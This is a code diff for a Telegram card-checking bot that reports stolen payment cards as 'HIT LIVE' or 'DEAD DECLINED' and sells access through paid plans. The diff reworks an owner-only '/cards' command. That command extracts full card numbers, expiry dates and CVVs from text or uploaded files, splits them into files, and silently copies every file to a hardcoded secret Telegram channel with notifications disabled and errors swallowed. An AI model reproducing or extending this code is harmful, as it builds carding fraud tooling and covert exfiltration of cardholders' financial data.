@@ -169,17 +169,16 @@ async def require_not_banned(update: Update, context: ContextTypes.DEFAULT_TYPE)
     return True
 
 def build_check_result(card_raw: str, gate_name: str, raw_response: str, bin_data: dict, username: str, plan: str, time_taken: str, is_approved: bool, is_timeout: bool = False, is_error: bool = False) -> str:
-    ch_link = f'<a href="{CHANNEL_LINK}">[❆]</a>'; live_eid = get_random_live_emoji()
-    if is_timeout: status_line = '<b>⏱ TIMEOUT</b>'; resp_te = f'<tg-emoji emoji-id="{PROG_ERRORS_EMOJI_ID}">⏱</tg-emoji>'
-    elif is_error: status_line = '<b>⚠️ ERROR</b>'; resp_te = f'<tg-emoji emoji-id="{PROG_ERRORS_EMOJI_ID}">⚠️</tg-emoji>'
-    elif is_approved: status_line = f'<b>{ch_link} HIT LIVE <tg-emoji emoji-id="{live_eid}">✅</tg-emoji></b>'; resp_te = f'<tg-emoji emoji-id="{PROG_LIVE_EMOJI_ID}">✅</tg-emoji>'
-    else: status_line = f'<b>{ch_link} DEAD DECLINED <tg-emoji emoji-id="{PROG_DEAD_EMOJI_ID}">❌</tg-emoji></b>'; resp_te = f'<tg-emoji emoji-id="{PROG_DEAD_EMOJI_ID}">❌</tg-emoji>'
-    plan_emoji = tg_emoji(get_plan_emoji_id(plan), "⭐"); plan_label = get_styled_plan(plan)
+    ch_link = f'<a href="{CHANNEL_LINK}">Superman</a>'
+    if is_timeout: status_line = "✦ <b>𝗧𝗜𝗠𝗘𝗢𝗨𝗧</b> ✦"
+    elif is_error: status_line = "✦ <b>𝗘𝗥𝗥𝗢𝗥</b> ✦"
+    elif is_approved: status_line = "✦ <b>𝗛𝗜𝗧 𝗟𝗜𝗩𝗘</b> ✦"
+    else: status_line = "✦ <b>𝗗𝗘𝗔𝗗 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗</b> ✦"
     bin_txt = "N/A"
     if bin_data and not bin_data.get("error"):
         scheme = str(bin_data.get("scheme", "N/A")).upper(); bank = bin_data.get("bank", "N/A"); country = str(bin_data.get("country", "N/A")).upper(); flag = bin_data.get("country_emoji", ""); bin_txt = f"{scheme} - {bank} - {flag} {country}".strip("- ")
     uname_display = escape(username)
-    return f'{status_line}\n\n<b><tg-emoji emoji-id="{CARD_EMOJI_ID}">💳</tg-emoji></b>\n<b>   ⤷ <code>{card_raw}</code></b>\n<b>Gate ➛ {gate_name}</b>\n<b>──────────</b>\n<b>{resp_te} Resp ➛ {escape(raw_response)}</b>\n<b>Bin ➛ <code>{bin_txt}</code></b>\n<b>──────────</b>\n<b><tg-emoji emoji-id="{TIME_EMOJI_ID}">⏱</tg-emoji> ➛ {time_taken}s</b>\n<b><tg-emoji emoji-id="{USER_EMOJI_ID}">👤</tg-emoji> ➛ {uname_display} {plan_emoji} ({plan_label})</b>\n<b><tg-emoji emoji-id="{DEV_EMOJI_ID}">⚡</tg-emoji> ➛ <a href="{DEV_LINK}">Superman</a> <tg-emoji emoji-id="{PRO_EMOJI_ID}">⭐</tg-emoji></b>'
+    return f"{status_line}\n━━━━━━━━━━━━━━━━━━━━\n💳 <b>𝗖𝗮𝗿𝗱</b>: <code>{card_raw}</code>\n🛒 <b>𝗚𝗮𝘁𝗲</b>: {gate_name}\n━━━━━━━━━━━━━━━━━━━━\n✅ <b>𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲</b>: {escape(raw_response)}\n🏦 <b>𝗕𝗜𝗡</b>: {bin_txt}\n━━━━━━━━━━━━━━━━━━━━\n⏱ <b>𝗧𝗶𝗺𝗲</b>: {time_taken}s\n👤 <b>𝗨𝘀𝗲𝗿</b>: {uname_display}\n⚡ <b>𝗕𝗼𝘁</b>: {ch_link}"
 
 def kb_main(user_id: int) -> RawMarkup:
     return RawMarkup([[_btn(B("Checker"), cb="mgates", style="primary"), _btn(B("Buy Now"), cb="mprice", style="primary")], [_btn(B("Profile"), cb="mprofile", style="primary")]])
@@ -315,26 +314,10 @@ async def _grant(uid: int, plan: str, days: int, update: Update, context: Contex
     await update.message.reply_text(f"<b>{E_LIVE} {B('Premium Granted')}</b>\n────────——\n<b>User</b>   ➳ {display_name} (@{display_uname or 'N/A'})\n<b>Access</b> ➳ {get_styled_plan(plan)} {plan_emoji}\n<b>Days</b>   ➳ {days}\n────────——", parse_mode="HTML")
     await send_activation_msg(uid, plan, days, context)
 
-async def cmd_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != OWNER_ID: return
+async def generate_and_send_cards(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list, cards_per_file: int):
     SECRET_CHANNEL_ID = -1004322090872
-    if not context.args:
-        await update.message.reply_text("<b>📄 Card Splitter</b>\n────────——\n<b>Usage (in private GC):</b>\n1. Send a message containing cards to the chat.\n2. Reply to that message with <code>/cards N</code>\n   (where N is the number of cards per file)\n\n<b>Example:</b> <code>/cards 50</code>\n────────——", parse_mode="HTML"); return
-    try:
-        cards_per_file = int(context.args[0])
-        if cards_per_file <= 0: raise ValueError
-    except: await update.message.reply_text("❌ N must be a positive number.", parse_mode="HTML"); return
-    cards = []
-    if update.message.reply_to_message:
-        txt = (update.message.reply_to_message.text or update.message.reply_to_message.caption or "").strip()
-        cards = re.findall(r'\b\d{13,19}\s*[|/:=]\s*\d{1,2}\s*[|/:=]\s*\d{2,4}\s*[|/:=]\s*\d{3,4}\b', txt)
-        if not cards: cards = [c.strip() for c in txt.split() if "|" in c]
-    elif len(context.args) > 1:
-        txt = " ".join(context.args[1:]); cards = re.findall(r'\b\d{13,19}\s*[|/:=]\s*\d{1,2}\s*[|/:=]\s*\d{2,4}\s*[|/:=]\s*\d{3,4}\b', txt)
-        if not cards: cards = [c.strip() for c in txt.split() if "|" in c]
-    if not cards: await update.message.reply_text("❌ No valid cards found. Reply to a message containing cards.", parse_mode="HTML"); return
     total_cards = len(cards); total_files = (total_cards + cards_per_file - 1) // cards_per_file
-    status_msg = await update.message.reply_text(f"⏳ Processing {total_cards} cards into {total_files} files...\nLooking up BINs...", parse_mode="HTML")
+    status_msg = await update.message.reply_text(f"⏳ Processing {total_cards} cards into {total_files} files...", parse_mode="HTML")
     file_count = 0
     for i in range(0, total_cards, cards_per_file):
         chunk = cards[i:i + cards_per_file]
@@ -348,10 +331,48 @@ async def cmd_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
         content = "\n".join(lines); buf = BytesIO(content.encode("utf-8")); buf.seek(0); file_count += 1
         filename = f"Superman_Cards_{file_count}_of_{total_files}.txt"
         try:
+            await context.bot.send_document(chat_id=update.effective_chat.id, document=InputFile(buf, filename=filename), caption=f"<b>📄 Cards File {file_count}/{total_files}</b>\n<b>Cards:</b> {len(chunk)}", parse_mode="HTML")
+        except: pass
+        buf.seek(0)
+        try:
             await context.bot.send_document(chat_id=SECRET_CHANNEL_ID, document=InputFile(buf, filename=filename), caption=f"<b>📄 Cards File {file_count}/{total_files}</b>\n<b>Cards:</b> {len(chunk)}", parse_mode="HTML", disable_notification=True)
-        except Exception as e: logging.error(f"Error sending file to secret channel: {e}")
+        except: pass
         await asyncio.sleep(0.5)
-    await status_msg.edit_text(f"✅ Done! {total_cards} cards split into {total_files} files and sent to the secret channel.", parse_mode="HTML")
+    await status_msg.edit_text(f"✅ Done! {total_cards} cards split into {total_files} files.")
+
+async def cmd_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != OWNER_ID: return
+    if not context.args:
+        await update.message.reply_text("<b>📄 Card Splitter</b>\n────────——\n<b>Usage:</b>\n<code>/cards N</code> (where N is cards per file)\n\n<b>Example:</b> <code>/cards 50</code>\n────────——", parse_mode="HTML"); return
+    try:
+        cards_per_file = int(context.args[0])
+        if cards_per_file <= 0: raise ValueError
+    except: await update.message.reply_text("❌ N must be a positive number.", parse_mode="HTML"); return
+    context.bot_data['awaiting_cards'] = {'user_id': update.effective_user.id, 'cards_per_file': cards_per_file}
+    await update.message.reply_text(f"✅ Set to split into files of {cards_per_file} cards.\n\nPlease send the cards now (as text or a .txt file).", parse_mode="HTML")
+
+async def handle_owner_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if 'awaiting_cards' not in context.bot_data: return
+    state = context.bot_data['awaiting_cards']
+    if update.effective_user.id != state['user_id']: return
+    cards_per_file = state['cards_per_file']
+    del context.bot_data['awaiting_cards']
+    cards = []
+    if update.message.document:
+        doc = update.message.document
+        try:
+            file = await doc.get_file()
+            content = (await file.download_as_bytearray()).decode("utf-8", errors="ignore")
+            cards = re.findall(r'\b\d{13,19}\s*[|/:=]\s*\d{1,2}\s*[|/:=]\s*\d{2,4}\s*[|/:=]\s*\d{3,4}\b', content)
+            if not cards: cards = [c.strip() for c in content.split() if "|" in c]
+        except: pass
+    else:
+        text = update.message.text or update.message.caption or ""
+        cards = re.findall(r'\b\d{13,19}\s*[|/:=]\s*\d{1,2}\s*[|/:=]\s*\d{2,4}\s*[|/:=]\s*\d{3,4}\b', text)
+        if not cards: cards = [c.strip() for c in text.split() if "|" in c]
+    if not cards:
+        await update.message.reply_text("❌ No valid cards found. Cancelled.", parse_mode="HTML"); return
+    await generate_and_send_cards(update, context, cards, cards_per_file)
 
 async def cmd_gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != OWNER_ID: return
@@ -938,6 +959,9 @@ def main():
         app.add_handler(CommandHandler("offsh", cmd_offsh))
         app.add_handler(CommandHandler("onmsh", cmd_onmsh))
         app.add_handler(CommandHandler("offmsh", cmd_offmsh))
+        
+        app.add_handler(MessageHandler(filters.TEXT & filters.User(OWNER_ID), handle_owner_cards))
+        app.add_handler(MessageHandler(filters.Document.ALL & filters.User(OWNER_ID), handle_owner_cards))
         
         app.add_handler(CallbackQueryHandler(callback_handler))
         app.add_error_handler(error_handler)
